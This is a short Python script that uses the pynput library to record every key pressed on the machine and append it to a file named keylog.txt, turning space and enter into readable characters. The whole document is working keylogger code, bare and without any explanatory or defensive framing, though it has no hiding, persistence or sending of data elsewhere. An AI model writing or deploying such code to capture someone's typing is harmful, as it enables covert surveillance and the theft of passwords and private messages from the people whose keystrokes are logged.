from pynput.keyboard import Listener

def write_to_file(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.enter':
        key = '\n'
    with open("keylog.txt", "a") as f:
        f.write(key)

def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()
